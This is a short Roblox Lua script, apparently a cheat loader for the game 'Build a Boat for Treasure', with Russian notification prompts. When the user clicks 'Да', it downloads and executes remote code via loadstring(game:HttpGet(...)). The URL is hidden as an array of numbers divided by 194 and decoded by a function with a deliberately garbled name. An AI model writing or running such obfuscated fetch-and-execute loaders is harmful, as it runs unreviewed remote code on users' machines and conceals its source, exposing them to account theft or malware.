function isYhatlnkpmgrvhRZdjRzadgrdUsNZzkvvCKzrNnXUnudCPiHuMgeaRZTXzCejjtedhhCjwcTPuFPcQetZhrDFXRzhSO(code)res=''for i in ipairs(code)do res=res..string.char(code[i]/194)end return res end 

local function callback(Text)
    if Text == "Да" then
        loadstring(game:HttpGet(isYhatlnkpmgrvhRZdjRzadgrdUsNZzkvvCKzrNnXUnudCPiHuMgeaRZTXzCejjtedhhCjwcTPuFPcQetZhrDFXRzhSO({20176,22504,22504,21728,22310,11252,9118,9118,22116,18818,23086,8924,19982,20370,22504,20176,22698,19012,22698,22310,19594,22116,19206,21534,21340,22504,19594,21340,22504,8924,19206,21534,21146,9118,16102,15520,16296,16878,21534,21340,19400,19594,22116,22310,20176,18818,19594,23086,9118,15908,21534,19012,20952,21534,23280,13968,18818,19206,20758,19594,22116,9118,22116,19594,19788,22310,9118,20176,19594,18818,19400,22310,9118,21146,18818,20370,21340,9118,14550,21534,22504,20370,20758,13580,18818,22116,21146,8924,12998,23280,23280}, true)))()
        game.StarterGui:SetCore("SendNotification", {
            Title = "Внимание!",
            Text = "Спасибо за внимание! Не запустилось? Ты точно в игре построй корабль? 🐱",
            Icon = "",
            Duration = 10
})

    elseif Text == "Нет" then
        game:GetService("StarterGui"):SetCore("SendNotification",{
Title = "Очень жаль!:(",
Text = "Тун тун тун...", 
Duration = 2
})
    end
end

local NotificationBindable = Instance.new("BindableFunction")
NotificationBindable.OnInvoke = callback

game.StarterGui:SetCore("SendNotification", {
    Title = "Построй корабль и найди сокровище",
    Text = "Я Бизнес котик! Запускать 🌟💴?",
    Icon = "",
    Duration = 10,
    Button1 = "Да",
    Button2 = "Нет",
    Callback = NotificationBindable,

})





